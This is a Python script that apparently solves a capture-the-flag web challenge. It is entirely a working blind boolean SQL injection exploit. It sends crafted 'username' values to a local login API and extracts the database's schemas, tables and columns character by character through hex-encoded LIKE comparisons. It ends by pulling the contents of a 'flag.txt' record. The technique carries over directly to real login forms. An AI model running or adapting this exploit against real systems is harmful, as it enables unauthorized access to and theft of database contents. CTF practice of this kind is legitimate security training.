import requests

DEFAULT_SCHEME = "http"
DEFAULT_HOST = "localhost"
DEFAULT_PORT = 9030

class AntiDriveSolver:
    def __init__(self) -> None:
        base_url = f"{DEFAULT_SCHEME}://{DEFAULT_HOST}:{DEFAULT_PORT}"
        self.login_endpoint = f"{base_url}/php/api.php"

    def inject_sql(self, payload: str) -> bool:
        data = {
            "action": "login",
            "username": payload,
            "password": "irrelevant"
        }

        if requests.post(self.login_endpoint, data=data).status_code == 200:
            return True
        else:
            return False

    def fixed_query(self, column: str, table: str, condition: str = "") -> str:
        """ Returns a fixed SQL query for the given parameters.
         - column: the column to select
         - table: the table to query
         - cell_is: the value the cell must be equal to
        """

        query = "' OR "

        if condition:
            query += f"(SELECT hex(group_concat({column})) FROM {table}"
            query += f" WHERE {condition})"
        else:
            query += f"(SELECT hex(group_concat({column})) FROM {table})"

        result, checker = '', lambda x: f"{query} LIKE '{x}%' -- -"
        print(f"Found so far: ", end='', flush=True)

        while True:
            for ch in "abcdef0123456789":
                test_query = checker(result + ch)

                if self.inject_sql(test_query):
                    print(f"{ch}", end='', flush=True)
                    result += ch

                    break
            else:
                print()
                break

        return bytes.fromhex(result).decode()

def main() -> int:
    solver = AntiDriveSolver()

    print(
        "databases:",
        solver.fixed_query("schema_name", "information_schema.schemata"), '\n'
    )

    print(
        "tables in ctfuser:",
        solver.fixed_query("table_name", "information_schema.tables", "table_schema='ctfuser'"), '\n'
    )

    print(
        "columns in table file:",
        solver.fixed_query("column_name", "information_schema.columns", "table_name='file'"), '\n'
    )

    flag = solver.fixed_query("contenuto", "ctfuser.file", "nome='flag.txt'")

    print(flag)
    return 0


if __name__ == "__main__":
	raise SystemExit(main())

